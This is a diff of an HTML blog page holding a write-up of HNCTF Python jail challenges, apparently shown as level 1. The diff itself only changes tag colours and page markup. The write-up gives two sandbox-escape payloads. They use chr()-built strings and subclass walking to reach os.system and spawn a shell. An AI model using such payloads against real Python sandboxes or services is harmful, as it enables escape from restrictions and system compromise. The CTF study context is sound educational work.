@@ -112,14 +112,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/ctf/" style="color: #00a596">
+                <a href="/tags/ctf/" style="color: #ffa2c4">
                     ctf
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/jail/" style="color: #ffa2c4">
+                <a href="/tags/jail/" style="color: #00bcd4">
                     jail
                 </a>
             </span>
@@ -128,7 +128,8 @@
         
     </div>
     <div class="content" v-pre>
-        <h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h5 id="Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail"><a href="#Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail" class="headerlink" title="Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail."></a>Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h5><h3 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL 1"></a>LEVEL 1</h3><p><img src="/2022/11/01/pythonJail/level1.png" alt="level1"></p>
+        <h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h5 id="Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail"><a href="#Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail" class="headerlink" title="Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail."></a>Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h5><span id="more"></span>
+<h3 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL 1"></a>LEVEL 1</h3><p><img src="/2022/11/01/pythonJail/level1.png" alt="level1"></p>
 <h5 id="From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses"><a href="#From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses" class="headerlink" title="From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple)  ().\__class\__.\__base\__.\__subclasses\__()"></a>From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple) <code> ().\__class\__.\__base\__.\__subclasses\__()</code></h5><h5 id="is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted"><a href="#is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted" class="headerlink" title="is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use chr to splicing a string that we wanted."></a>is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use <code>chr</code> to splicing a string that we wanted.</h5><h5 id="Two-possible-payload"><a href="#Two-possible-payload" class="headerlink" title="Two possible payload:"></a>Two possible payload:</h5><blockquote>
 <p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>(().<em>_class</em><em>.__base</em><em>.__subclasses__()[-4].__init__.__globals</em>_<a href="'sh'">‘system’</a>)</p>
 </blockquote>
